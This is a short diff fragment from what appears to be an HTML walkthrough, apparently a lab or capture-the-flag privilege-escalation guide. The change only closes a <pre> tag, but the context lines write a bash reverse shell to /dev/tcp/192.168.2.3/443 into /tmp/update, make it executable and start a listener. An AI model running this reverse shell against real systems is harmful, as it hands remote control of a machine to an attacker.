@@ -126,7 +126,7 @@ Write to /tmp/update:
 bash -i >& /dev/tcp/192.168.2.3/443 0>&1
 </pre>  
 Make it executable:
-<pre
+<pre>
   chmod +x /tmp/update
 </pre>
 Start listener:
